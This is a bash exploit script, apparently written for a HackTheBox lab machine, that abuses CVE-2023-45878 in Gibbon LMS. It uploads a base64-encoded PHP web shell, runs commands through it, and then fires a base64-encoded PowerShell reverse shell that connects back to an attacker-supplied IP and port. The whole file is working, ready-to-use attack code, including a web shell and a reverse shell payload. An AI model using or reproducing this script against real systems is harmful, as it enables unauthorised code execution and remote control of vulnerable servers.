#!/bin/bash

# author ---> 0xmr 
#this script is based on the CVE-2023-45878

echo "Please Enter your file name .."
read file
echo "    <---------"

echo "[+] file uploaded"
curl -s -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b&path=$file.php&gibbonPersonID=0000000001S"

echo -e "\n[+] Printing whoami...\n"
curl -s "http://frizzdc.frizz.htb/Gibbon-LMS/$file.php?cmd=whoami"

echo -e "\n  ======= Reverse shell time ========="
echo -n "Your IP address: "
read ip 
echo -n "Your port number: "
read port 

# PowerShell reverse shell payload with user-supplied IP and port
payload="\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"

# Encode to UTF-16LE and then Base64 (for powershell -enc)
echo "$payload" | iconv -t UTF-16LE | base64 -w 0 > final_payload.txt

echo "[+] Malicious payload saved in final_payload.txt"
encoded=$(cat final_payload.txt)

# Execute payload via uploaded PHP webshell
echo "[+] Triggering reverse shell..."
echo "[+] Enjoy your shell baby...."
curl -s "http://frizzdc.frizz.htb/Gibbon-LMS/$file.php?cmd=powershell+-enc+$encoded"
